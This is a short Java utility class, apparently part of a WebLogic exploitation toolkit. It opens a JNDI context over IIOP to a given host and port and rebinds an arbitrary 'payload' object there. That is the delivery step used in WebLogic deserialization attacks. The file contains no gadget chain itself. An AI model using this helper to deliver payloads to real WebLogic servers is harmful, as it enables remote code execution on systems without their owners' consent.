package utils.weblogic;


import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

public class IIOPProtocolOperation {
    public static void send(String ip, String port, Object payload) throws NamingException {
        String rhost = String.format("iiop://%s:%s", ip, port);

        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url", rhost);
        Context context = new InitialContext(env);

        context.rebind("test" + System.nanoTime(), payload);
    }
}
